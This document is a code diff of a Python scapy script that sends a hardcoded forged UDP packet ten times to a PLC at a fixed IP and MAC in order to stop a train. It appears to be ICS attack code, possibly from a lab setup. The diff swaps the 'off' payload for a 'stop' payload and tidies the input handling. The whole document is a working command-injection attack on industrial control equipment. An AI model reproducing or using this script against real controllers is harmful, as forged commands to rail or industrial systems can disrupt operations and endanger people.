@@ -1,12 +1,7 @@
 # -*- coding: utf-8 -*-
 import scapy.all as scapy
-from random import randint
-import threading, os, sys, optparse
-import atexit
-import time
-from construct import *
 from scapy.layers.l2 import Ether
-from scapy.sendrecv import sendp, send
+from scapy.sendrecv import sendp
 from scapy.layers.inet import UDP, IP
 
 # ---------------------------------------
@@ -20,24 +15,24 @@ PLC_IP = "192.168.3.39"  # This is the target ip
 PLC_MAC = "30:be:3b:8a:1a:f9"
 # ---------------------------------------
 
-attack_packet_off = "57000000001111070000ffff0300000000000022001c000a08000000000000000014022d0000000001000090000a0000000000000001000000000000000000"
+attack_packet_stop = "5618675505111107e000ffff038911451507c022001c080a08099044368fac30b014022d009547000100ac90000a00732905003780115267450a3e"
 
 
-def Send_TRAIN_OFF():
-    data_off = bytes.fromhex(attack_packet_off)
+def Send_TRAIN_STOP():
+    data_off = bytes.fromhex(attack_packet_stop)
     udpf = Ether(src = Local_MAC) / IP(src=Local_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_off)
     for _ in range(10):
         sendp(udpf)
-    print("TRAIN OFF \n")
+    print("TRAIN STOP\n")
 
 def main():
     while True:
-        user_input = input("Enter a number (1:TRAIN OFF (10 packets); Others: Exit):")
-        if user_input != 1:
+        user_input = input("Enter a number (1:TRAIN STOP (10 packets); Others: Exit):")
+        if user_input not in ['1']:
             print("Bye")
             exit(0)
         if user_input == '1':
-            Send_TRAIN_OFF()
+            Send_TRAIN_STOP()
 
 
 if __name__ == '__main__':
